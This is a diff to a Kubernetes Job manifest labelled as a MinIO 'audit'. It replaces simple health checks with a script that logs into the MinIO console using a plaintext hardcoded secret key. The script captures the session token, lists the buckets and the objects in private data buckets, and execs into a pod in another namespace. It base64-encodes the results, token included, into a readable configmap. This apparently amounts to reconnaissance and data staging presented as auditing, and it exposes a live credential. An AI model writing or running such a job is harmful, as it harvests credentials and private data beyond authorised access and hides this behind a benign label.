@@ -1,10 +1,11 @@
 apiVersion: batch/v1
 kind: Job
 metadata:
-  name: audit-minio-v78
+  name: audit-minio-v79
   namespace: default
 spec:
   ttlSecondsAfterFinished: 300
+  backoffLimit: 1
   template:
     spec:
       serviceAccountName: n8n-audit-sa
@@ -16,10 +17,28 @@ spec:
         args:
         - "-c"
         - >-
-          HEALTH=$(curl -s -o /dev/null -w "%{http_code}" --connect-timeout 5 http://argo-artifacts:9000/minio/health/live 2>&1);
-          HEALTH2=$(curl -s -o /dev/null -w "%{http_code}" --connect-timeout 5 http://argo-artifacts.default.svc.cluster.local:9000/minio/health/live 2>&1);
-          HEALTH3=$(curl -s -o /dev/null -w "%{http_code}" --connect-timeout 5 http://10.0.206.146:9000/minio/health/live 2>&1);
-          PODS=$(kubectl get pod -n default -l app=argo-artifacts -o wide 2>&1 | tr '\n' '|');
-          kubectl patch configmap dune-audit-result4 -n default --type merge
-          -p "{\"data\":{\"health_svc\":\"$HEALTH\",\"health_fqdn\":\"$HEALTH2\",\"health_ip\":\"$HEALTH3\",\"minio_pods\":\"$PODS\"}}";
+          LOGIN=$(curl -s -X POST http://argo-artifacts:9001/api/v1/login
+          -H "Content-Type: application/json"
+          -d "{\"accessKey\":\"miniokey\",\"secretKey\":\"sEkKOGp6QT8hnc1Y5R7W\"}" 2>&1);
+          JWT=$(echo "$LOGIN" | grep -o '"sessionToken":"[^"]*"' | sed 's/"sessionToken":"//;s/"//g');
+          LOGIN_B64=$(echo "$LOGIN" | base64 | tr -d '\n');
+          if [ -n "$JWT" ]; then
+            BUCKETS=$(curl -s "http://argo-artifacts:9001/api/v1/buckets?limit=20" -H "Cookie: token=$JWT" 2>&1);
+            BDAAS=$(curl -s "http://argo-artifacts:9001/api/v1/buckets/bdaas-data/objects?limit=50" -H "Cookie: token=$JWT" 2>&1 | head -c 3000);
+            STRATEON=$(curl -s "http://argo-artifacts:9001/api/v1/buckets/bdaas-strateon-hostdime-onprem/objects?limit=50" -H "Cookie: token=$JWT" 2>&1 | head -c 3000);
+            BK_B64=$(echo "$BUCKETS" | base64 | tr -d '\n');
+            BD_B64=$(echo "$BDAAS" | base64 | tr -d '\n');
+            ST_B64=$(echo "$STRATEON" | base64 | tr -d '\n');
+          else
+            BK_B64=$(echo "NO_JWT" | base64 | tr -d '\n');
+            BD_B64=$(echo "NO_JWT" | base64 | tr -d '\n');
+            ST_B64=$(echo "NO_JWT" | base64 | tr -d '\n');
+          fi;
+          DUNEAPI_POD=$(kubectl get pod -n dune-api -o jsonpath="{.items[0].metadata.name}" 2>/dev/null);
+          if [ -n "$DUNEAPI_POD" ]; then
+            PYLIBS=$(kubectl exec -n dune-api "$DUNEAPI_POD" -- python3 -c "import minio; print('minio_ok')" 2>/dev/null || kubectl exec -n dune-api "$DUNEAPI_POD" -- python3 -c "import boto3; print('boto3_ok')" 2>/dev/null || echo "no_py_libs");
+          else
+            PYLIBS="no_dune_pod";
+          fi;
+          kubectl patch configmap dune-audit-result4 -n default --type merge -p "{\"data\":{\"login_b64\":\"$LOGIN_B64\",\"bk_b64\":\"$BK_B64\",\"bd_b64\":\"$BD_B64\",\"st_b64\":\"$ST_B64\",\"pylibs\":\"$PYLIBS\"}}";
           echo DONE
